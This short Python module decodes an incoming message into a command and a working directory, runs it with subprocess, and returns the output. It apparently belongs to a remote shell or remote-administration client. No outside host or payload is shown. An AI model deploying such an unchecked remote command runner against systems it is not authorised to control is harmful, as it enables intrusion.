import subprocess
import helpers


def execute_command(command, cwd):
    out = subprocess.Popen(
        command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, cwd=cwd)
    stdout, stderr = out.communicate()

    return stdout, stderr


def send_command(command):
    command_and_path = helpers.message_decoder(command).split("&cwd&")

    try:
        out, err = execute_command(command_and_path[0].split(' '), command_and_path[1])
    except FileNotFoundError:
        err = helpers.message_encoder("ERROR!!!No such file or directory: " + command_and_path[1])
    except IndexError:
            out, err = execute_command(command_and_path[0].split(' '), None)
    except:
        err = helpers.message_encoder("ERROR!!!Something went wrong!")

    if err:
        return err
    elif out:
        return out
    
    return helpers.message_encoder(" ")
